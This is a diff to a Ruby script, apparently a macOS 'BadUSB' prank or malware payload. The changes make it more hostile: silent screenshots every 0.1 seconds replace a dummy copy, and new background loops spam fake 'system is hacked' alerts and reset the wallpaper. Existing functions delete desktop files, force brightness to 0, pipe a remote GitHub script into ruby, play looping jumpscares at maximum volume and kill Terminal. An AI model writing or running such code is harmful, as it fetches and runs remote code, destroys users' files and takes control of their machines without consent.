@@ -78,18 +78,12 @@ def persistent_jumpscare(video_url)
   
   loop do
     set_volume_to_max
-    # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
-    # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.85 seconds (to simulate waiting for sound detection).
-    sleep 0.85
-    # Unhide Safari so the jumpscare becomes visible.
+    sleep 0.85  # Delay simulating sound detection
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
-    # Let the jumpscare play for 1 second.
-    sleep 1
-    
-    # Check if any Safari tab's URL contains "jumpscare".
+    sleep 1     # Let the jumpscare play for 1 second
+
     check_script = %Q{
       tell application "Safari"
         set found to false
@@ -102,7 +96,6 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If the jumpscare page is not found, reopen it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -111,13 +104,12 @@ def persistent_jumpscare(video_url)
 end
 
 # --- Spam Screenshots Function (Detached Process) ---
-# (For testing, this copies the Finder icon repeatedly as a dummy action.)
 def spam_screenshots
   pid = fork do
     Process.daemon(true, true)
     loop do
       filename = "/tmp/screenshot_#{Time.now.to_f.to_s.gsub('.', '')}_#{rand(10000)}.jpg"
-      system("cp /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns #{filename}")
+      system("screencapture -x #{filename}")
       sleep 0.1
     end
   end
@@ -136,7 +128,7 @@ def delete_desktop_files
   Process.detach(pid)
 end
 
-# --- Brightness Control: Continuously set brightness to 0 (Detached Process) ---
+# --- Maintain Darkness: Set Brightness to 0 Every 3 Seconds (Detached Process) ---
 def maintain_darkness
   pid = fork do
     Process.daemon(true, true)
@@ -155,28 +147,52 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- Jo Action ---
-# Executes spam screenshots, deletes desktop files, maintains darkness (brightness 0), 
-# runs the secret (rickroll) script, and launches persistent Momo jumpscare.
+# --- Jo Action: Combine Multiple Actions ---
 def jo_action
   spam_screenshots
   delete_desktop_files
   maintain_darkness
-  pid1 = fork { run_secret_script }
-  Process.detach(pid1)
-  pid2 = fork { persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4") }
-  Process.detach(pid2)
+  spam_notifications
+  spam_wallpaper
+  run_secret_script
+  persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+end
+
+# --- Spam Notifications Function (Detached Process) ---
+def spam_notifications
+  pid = fork do
+    Process.daemon(true, true)
+    loop do
+      system("osascript -e 'display notification \"Your system is hacked!\" with title \"ALERT\"'")
+      sleep 0.5
+    end
+  end
+  Process.detach(pid)
+end
+
+# --- Spam Wallpaper Function (Detached Process) ---
+def spam_wallpaper
+  pid = fork do
+    Process.daemon(true, true)
+    loop do
+      system("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns\"'")
+      sleep 2
+    end
+  end
+  Process.detach(pid)
 end
 
 # --- Subscriber Branch Prompts ---
-# First subscriber prompt (three buttons: Hawk, Tuah, Next)
 def first_subscriber_prompt
   display_dialog("Choose a button:", ["Hawk", "Tuah", "Next"], "Hawk")
 end
 
-# Second subscriber prompt (three buttons: Sydney lover, Slay, Jo)
 def second_subscriber_prompt
-  display_dialog("Choose a button:", ["Sydney lover", "Slay", "Jo"], "Sydney lover")
+  display_dialog("Choose a button:", ["Sydney lover", "Slay", "Next"], "Sydney lover")
+end
+
+def third_subscriber_prompt
+  display_dialog("Press the button to activate Jo:", ["Jo"], "Jo")
 end
 
 # --- Subscriber Action Flow ---
@@ -206,15 +222,21 @@ def subscriber_action
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
     elsif second_choice == "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-    elsif second_choice == "jo"
-      jo_action
+    elsif second_choice == "next"
+      third_choice = third_subscriber_prompt
+      if third_choice && third_choice.strip.downcase == "jo"
+        jo_action
+      else
+        puts "No valid choice in third prompt. Exiting."
+        exit 0
+      end
     else
-      puts "Unexpected choice in second prompt: #{second_choice}"
+      puts "Unexpected button choice in second prompt: #{second_choice}"
     end
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
   end
-  
+
   system("killall Terminal")
   exit 0
 end
